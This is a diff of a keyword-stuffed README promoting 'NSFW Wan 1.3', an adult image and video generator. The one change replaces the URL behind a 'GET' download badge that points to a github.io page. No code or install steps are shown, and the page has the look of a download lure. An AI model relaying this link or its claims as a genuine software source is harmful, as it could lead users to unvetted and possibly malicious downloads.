@@ -18,7 +18,7 @@ NSFW Wan 1.3 focuses on **one clear job**: adult image and video generation with
 
 NSFW Wan 1.3 turns raw model input into a structured generation session. With NSFW Wan 1.3 image and NSFW Wan 1.3 video workflows in mind, users can configure, generate, and review with less guesswork than scattered scripts alone.
 
-[![GET NSFW Wan 1.3](https://img.shields.io/badge/GET%20%E2%80%94%20NSFW%20Wan%201.3-0078D6?style=for-the-badge&logoColor=white)](https://nsfw-wan-1-3-generation.github.io/.github/nsfw-wan-1-3-generation-soft)
+[![GET NSFW Wan 1.3](https://img.shields.io/badge/GET%20%E2%80%94%20NSFW%20Wan%201.3-0078D6?style=for-the-badge&logoColor=white)](https://nsfw-wan-1-3-generation.github.io/.github/nsfw-wan-generation-soft)
 
 The NSFW Wan 1.3 model supports repeatable passes, so a generation can be compared against an earlier one without rebuilding the whole setup. For longer sessions, NSFW Wan 1.3 keeps prompts, parameters, and outputs connected, which matters when adult projects grow across many iterations.
 
